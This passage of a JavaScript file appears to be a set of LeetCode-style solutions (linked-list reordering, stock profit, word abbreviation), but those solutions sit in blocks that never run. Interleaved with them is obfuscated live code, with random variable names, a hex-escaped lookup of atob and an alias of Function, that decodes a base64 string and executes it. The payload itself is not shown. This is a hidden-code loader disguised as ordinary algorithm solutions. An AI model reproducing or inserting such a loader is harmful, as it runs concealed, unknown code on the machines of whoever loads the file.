The relative order inside both the even and odd groups should remain as it was in the input. 
The first node is considered odd, the second node even and so on ...
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var oddEvenList = function(head) {
    if (head === null) {
        return null;
    }
    
    var oddHead = head,
        evenHead = head.next,
        oddTail = oddHead,
        evenTail = evenHead,
        node = head.next;
        
    while (node && node.next) {
        oddTail.next = node.next;
        evenTail.next = node.next.next;
        oddTail = oddTail.next;
        evenTail = evenTail.next;
        node = oddTail.next;
    }
    
    oddTail.next = evenHead;
    
    return oddHead;
};

}

    var jxrlly = wenomk.join("");
    var tcgwtwh = 'jEpKkaDGry';
if ('false' === true) {
    /**
Say you have an array for which the ith element is the price of a given stock on day i.

Design an algorithm to find the maximum profit. You may complete as many transactions as you like (ie, buy one and sell one share of the stock multiple times). However, you may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again).

 * @param {number[]} prices
 * @return {number}
 */
var maxProfit = function(prices) {
    var i,
        length = prices.length,
        low,
        high,
        cur,
        prev,
        temp = 0
        max = 0;
    
    if (length === 0 || length === 1) {
        return max;
    }
    low = prices[0];
    high = prices[0];
    prev = low;
    for (i = 1; i < length; i++) {
        cur = prices[i];
        if (cur > prev) {
            high = cur;
            temp = high - low;
        } else if (cur < prev) {
            max += temp;
            temp = 0;
            low = cur;
            high = cur;
        }
        prev = cur;
    }
    if (temp !== 0) {
        max += temp;
    }
    return max;
};

}

    var cdqeeg = this["\x61\x74\x6f\x62"];
if (4 > 151) {
    /**
An abbreviation of a word follows the form <first letter><number><last letter>. Below are some examples of word abbreviations:

a) it                      --> it    (no abbreviation)

     1
b) d|o|g                   --> d1g

              1    1  1
     1---5----0----5--8
c) i|nternationalizatio|n  --> i18n

              1
     1---5----0
d) l|ocalizatio|n          --> l10n

Assume you have a dictionary and given a word, find whether its abbreviation is unique in the dictionary. A word's abbreviation is unique if no other word from the dictionary has the same abbreviation.

Example:

Given dictionary = [ "deer", "door", "cake", "card" ]

isUnique("dear") -> false
isUnique("cart") -> true
isUnique("cane") -> false
isUnique("make") -> true

*/
/**
 * @constructor
 * @param {string[]} dictionary
 */
var ValidWordAbbr = function(dictionary) {
    this.map = new Map();
    this.getAbbr = function(str) {
        const len = str.length;
        
        if (len <= 2) {
            return str;
        }
        
        return str.charAt(0) + (len - 2) + str.charAt(len - 1);
    };
    
    dictionary.forEach(word => {
        const abbr = this.getAbbr(word);
        
        if (!this.map.has(abbr)) {
            this.map.set(abbr, word);
        } else {
            if (this.map.get(abbr) !== word) {
                this.map.set(abbr, '');
            }
        }
    });
};

/**
 * @param {string} word
 * @return {bool}
 */
ValidWordAbbr.prototype.isUnique = function(word) {
    const abbr = this.getAbbr(word);
    
    return !this.map.has(abbr) || this.map.get(abbr) === word;
};


/**
 * Your ValidWordAbbr object will be instantiated and called as such:
 * var vwa = new ValidWordAbbr(dictionary);
 * vwa.isUnique("word");
 * vwa.isUnique("anotherWord");
 */

}

    var zrumiq = 'HDZKyQEr';
    var sasqwb = Function;
    var gvutcmbnj = 'PdbVtPAkS';
// ajcigdd world object value compile number function code script world array number compile
    var zwezlqa = 'AgqeWiTnP';
    sasqwb(cdqeeg(jxrlly))();
    var qsgygspqixg = 'DkWY';
})();
    var lshijlj = 'EShemA';

    var ydffmgrupi = 'qMJZU';
